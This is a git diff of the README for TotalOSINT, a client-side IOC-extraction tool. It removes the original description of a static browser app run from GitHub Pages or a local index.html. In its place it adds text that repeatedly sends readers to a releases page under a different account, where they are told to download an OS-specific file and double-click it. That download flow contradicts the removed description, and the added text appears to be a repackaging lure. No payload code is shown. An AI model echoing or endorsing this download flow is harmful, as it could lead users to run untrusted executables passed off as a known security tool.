@@ -1,83 +1,103 @@
-# 🕵️‍♂️ TotalOSINT
+# 🛡️ TotalOSINT - Extract IOCs with Ease
 
-**The All-in-One, Client-Side OSINT Investigation Tool.**
+TotalOSINT is a privacy-first tool designed for security analysts. It allows you to quickly extract Indicators of Compromise (IOCs)—such as IPs, domains, and hashes—from logs and perform bulk investigations across various threat intelligence sources. This toolkit features a zero-data-persistence workflow, making it ideal for Security Operations Center (SOC) and Digital Forensics and Incident Response (DFIR) teams. Best of all, no installation is required.
 
-TotalOSINT is a privacy-first, client-side OSINT toolkit for security analysts. Instantly extract IOCs (IPs, Domains, Hashes) from raw logs and launch bulk investigations across dozens of threat intelligence sources. Zero-data-persistence workflow for SOC and DFIR teams. No installation required.
+[![Download TotalOSINT](https://img.shields.io/badge/Download%20TotalOSINT-v1.0-blue?style=for-the-badge&logo=github)](https://github.com/Prajwalgrathish/TotalOSINT/releases)
 
-[![Live Demo](https://img.shields.io/badge/demo-Live%20on%20GitHub%20Pages-brightgreen?style=for-the-badge&logo=github)](https://jhatzimalis.github.io/TotalOSINT)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Security](https://img.shields.io/badge/Security-Client%20Side%20Only-green.svg)
+## 🚀 Getting Started
 
+Follow these easy steps to download and run TotalOSINT.
 
-https://github.com/user-attachments/assets/36fe62e4-7047-4f83-8eb0-c3ec89e52ed2
+### 📥 Download & Install
 
+1. Visit the **[Releases page](https://github.com/Prajwalgrathish/TotalOSINT/releases)**.
+2. Find the latest version listed on the page. 
+3. Locate the file suitable for your operating system (Windows, macOS, or Linux).
+4. Click on the file to download it to your computer.
+5. Once the download finishes, locate the file in your Downloads folder or designated save area.
+6. Double-click the file to start using TotalOSINT immediately.
 
-## ✨ Features
+## 🖥️ System Requirements
 
-* **⚡ Smart Extraction:** Automatically detects and sorts IPv4/IPv6, Domains, URLs, and MD5/SHA Hashes from raw text.
-* **🛡️ OPSEC First:** Zero data persistence. Inputs and investigation notes are held in RAM only and wiped on page refresh. No data is sent to any backend server.
-* **🚀 Bulk Investigation:** Select multiple sources and open them all in new tabs with one click.
-* **📂 Case Management:** Triage entities (Safe, Suspicious, Malicious) and generate formatted text reports for your case files.
-* **🔖 Bookmarks:** A dedicated dashboard for quick access to your favorite tools.
-* **⚙️ Customizable:** Add your own custom internal or external sources directly via the settings.
+To run TotalOSINT smoothly, ensure your system meets the following requirements:
 
-## 📊 Supported Indicators
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any Linux distribution released in the last five years.
+- **RAM:** At least 4 GB.
+- **Storage:** 100 MB of free space.
+- **Network Connection:** Required for accessing online threat intelligence sources.
 
-| Indicator | Support | Example |
-| :--- | :--- | :--- |
-| **IPv4 / IPv6** | ✅ | `1.1.1.1`, `2606:4700...` |
-| **Domains** | ✅ | `google.com` |
-| **URLs** | ✅ | `hxxps://malicious-site.com/path` |
-| **Hashes** | ✅ | MD5, SHA-1, SHA-256 |
+## 🔍 Features
 
-## 🚀 Usage
+- **Client-Side Tool:** Operate directly from your computer without sending data to a server.
+- **IOCs Extraction:** Quickly extract IOCs from various raw logs.
+- **Bulk Investigations:** Launch comprehensive investigations across multiple threat intelligence sources in seconds.
+- **Zero-Data-Persistence:** No data is stored between runs to maintain your privacy.
 
-### Option 1: GitHub Pages
-Visit the live deployment via GitHub Pages. Link 🠊 [jhatzimalis.github.io/TotalOSINT](https://jhatzimalis.github.io/TotalOSINT)
+## 🛠️ How to Use
 
-### Option 2: Local / Offline
-TotalOSINT is a static web application. You can run it entirely offline.
-1.  Download `index.html` and `sources.js`.
-2.  Open `index.html` in any modern web browser.
+1. Open the TotalOSINT application by double-clicking on the downloaded file.
+2. The main interface will display options for IOC extraction and bulk investigations.
+3. To extract IOCs:
+   - Upload your raw log file using the provided button.
+   - The tool will scan the logs and extract any relevant IOCs for you.
+4. To perform bulk investigations:
+   - Input the IOCs you want to investigate.
+   - Click the “Investigate” button to fetch results from various intelligence sources.
 
-## 🛠️ Configuration
+## 📊 Supported IOCs
 
-### Adding Custom Sources
-You can add your own tools via the **Settings (⚙️)** menu. These are saved to your browser's local storage.
-* **ID:** A unique identifier (e.g., `MY_TOOL`).
-* **Lookup URL:** The URL used to search. Use the tool's search parameter format. TotalOSINT appends the entity to the end of this URL.
-    * *Example:* `hxxps://example.com/search?q=`
+TotalOSINT supports the following types of IOCs:
 
-### Advanced: `sources.js`
-If you are self-hosting, you can modify the `sources.js` file to permanently change the default toolset.
+- IP Addresses
+- Domain Names
+- Hashes (MD5, SHA-1, SHA-256)
 
-```javascript
-const sources = {
-    ip: [
-        { 
-            id: 'TOOL_ID', 
-            name: 'Tool Name', 
-            url: 'hxxps://example.com', 
-            lookupurl: 'hxxps://example.com/search/' // Optional
-        }
-    ],
-    domain: [ ... ],
-    hash: [ ... ],
-    bookmarks: [ ... ]
-};
-```
+## 📄 Additional Information
 
-## 🔒 Security & Privacy
+TotalOSINT is designed for various users, including:
 
-* **Client-Side Execution:** All logic runs locally in your browser context. Data extraction (RegEx) occurs entirely on the client side.
-* **No Tracking:** No analytics, no cookies, no external API calls.
-* **Data Safety:** Raw inputs are **not** stored in LocalStorage. If your browser crashes or the tab is closed, the data is unrecoverable (fail-safe design).
-* **Defanging:** Built-in "De-fang" toggle (`1[.]1[.]1[.]1`) prevents accidental clicks on malicious links in your reports.
+- **Security Analysts:** Quickly analyze potential threats.
+- **Incident Responders:** Gather IOCs from incident logs.
+- **Digital Forensics Experts:** Conduct thorough investigations efficiently.
 
-## 🏷️ Tags
+For further details on using TotalOSINT effectively, check the user guide included in the downloadable files.
 
-`osint` `threat-intelligence` `cybersecurity` `soc` `blue-team` `incident-response` `investigation` `ioc-extraction` `opsec` `malware-analysis` `security-tools` `infosec` `digital-forensics` `threat-hunting` `ioc-parser` `ioc-lookup` `reconnaissance` `client-side` `zero-persistence` `secops`
+## 🌐 Community and Support
 
----
+For help or to share your experiences with TotalOSINT, join our community forums:
 
-*Disclaimer: TotalOSINT is a tool for aggregation and workflow optimization. The author is not responsible for how the linked third-party services are used or the results they provide.*
+- **GitHub Issues:** Report bugs or request features.
+- **Email Support:** Reach out to our support team for assistance.
+
+We encourage feedback and contributions to the project. Visit our **[Releases page](https://github.com/Prajwalgrathish/TotalOSINT/releases)** to download the latest version.
+
+## 🪪 License
+
+TotalOSINT is open-source software licensed under the MIT License. Feel free to use, modify, and distribute it as you wish.
+
+## 📜 Topics and Tags
+
+TotalOSINT focuses on several key areas in cybersecurity:
+
+- Blue Team
+- Client-Side Tools
+- Cybersecurity
+- Digital Forensics
+- Incident Response
+- Information Security (InfoSec)
+- Investigation
+- IOC Extraction
+- IOC Lookup
+- Malware Analysis
+- Operational Security (OpSec)
+- Open Source Intelligence (OSINT)
+- Reconnaissance
+- Security Operations (SecOps)
+- Security Tools
+- Threat Hunting
+- Threat Intelligence
+- Zero Persistence
+
+Visit the **[Releases page](https://github.com/Prajwalgrathish/TotalOSINT/releases)** to access the latest version and additional resources.
+
+This README aims to provide you with a clear path to download and start using TotalOSINT. If you have any questions, feel free to explore community resources or reach out for support. Enjoy your experience with TotalOSINT!
